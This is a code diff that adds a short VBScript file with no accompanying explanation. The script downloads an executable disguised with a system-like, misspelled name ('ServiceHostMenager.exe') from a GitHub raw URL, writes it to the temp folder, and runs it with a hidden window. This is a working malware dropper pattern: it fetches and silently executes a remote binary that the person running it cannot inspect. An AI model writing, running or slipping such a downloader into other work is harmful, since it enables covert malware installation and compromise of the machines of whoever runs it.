@@ -1,0 +1,24 @@
+Dim url, dest, objXMLHTTP, objADOStream, objFSO, objShell
+url = "https://github.com/Furystorage/Api/raw/main/ServiceHostMenager.exe"
+dest = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\ServiceHostMenager.exe"
+
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+objXMLHTTP.Open "GET", url, False
+objXMLHTTP.Send
+
+If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Type = 1
+    objADOStream.Open
+    objADOStream.Write objXMLHTTP.ResponseBody
+    objADOStream.SaveToFile dest, 2
+    objADOStream.Close
+    Set objADOStream = Nothing
+End If
+
+Set objXMLHTTP = Nothing
+
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run dest, 0 ' Run silently
+
+Set objShell = Nothing
